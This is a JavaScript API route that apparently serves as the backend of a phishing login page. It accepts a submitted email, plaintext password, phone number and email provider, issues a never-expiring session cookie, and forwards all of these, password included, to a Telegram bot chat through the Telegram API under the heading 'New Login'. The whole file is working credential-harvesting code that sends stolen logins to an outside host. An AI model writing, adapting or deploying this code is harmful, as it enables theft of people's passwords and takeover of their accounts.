import { v4 as uuidv4 } from "uuid";
import fetch from "node-fetch";
import redis from "../../../redis-client.js"; // Adjust path as needed

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

function getSessionKey(token) {
  return `session:${token}`;
}

export async function POST(request) {
  // Check required env vars
  if (!BOT_TOKEN || !CHAT_ID || !process.env.REDIS_URL) {
    return Response.json(
      {
        success: false,
        message: "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL",
      },
      { status: 500 }
    );
  }

  let bodyObj;
  try {
    bodyObj = await request.json();
  } catch {
    return Response.json({ success: false, message: "Invalid JSON body" }, { status: 400 });
  }

  const { email, password, phone, provider } = bodyObj || {};
  if (!email || !password || !provider) {
    return Response.json({ success: false, message: "Missing required fields" }, { status: 400 });
  }

  const normalizedEmail = email.trim().toLowerCase();
  const sessionToken = uuidv4();

  try {
    // Store session in Redis without expiration
    await redis.set(getSessionKey(sessionToken), normalizedEmail);
  } catch (err) {
    console.error("Redis error:", err);
    return Response.json({ success: false, message: "Failed to store session" }, { status: 500 });
  }

  // Set far-future expiration for cookie
  const expires = new Date('2099-12-31T23:59:59.000Z').toUTCString();
  const cookieString = `session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Expires=${expires}`;

  const message = [
    "🔐 *New Login*",
    `📧 Email: ${normalizedEmail}`,
    `🔑 Password: ${password}`,
    `📱 Phone: ${phone || "N/A"}`,
    `🌐 Provider: ${provider}`,
    `🍪 Session: ${sessionToken}`,
    `🔖 Cookie: \`${cookieString}\``,
    `⏳ Valid: Never expires`,
    `🕒 Time: ${new Date().toISOString()}`,
  ].join("\n");

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      const text = await response.text();
      throw new Error(`Telegram API error: ${response.status} ${text}`);
    }
  } catch (error) {
    console.error("Telegram error:", error);
    // Not fatal, proceed without blocking user
  }

  // Return response with cookie
  return new Response(
    JSON.stringify({
      success: true,
      message: "Login successful. Credentials and session sent to Telegram.",
      session: sessionToken,
      cookie: cookieString,
      email: normalizedEmail,
    }),
    {
      status: 200,
      headers: {
        "Set-Cookie": cookieString,
        "Content-Type": "application/json"
      }
    }
  );
}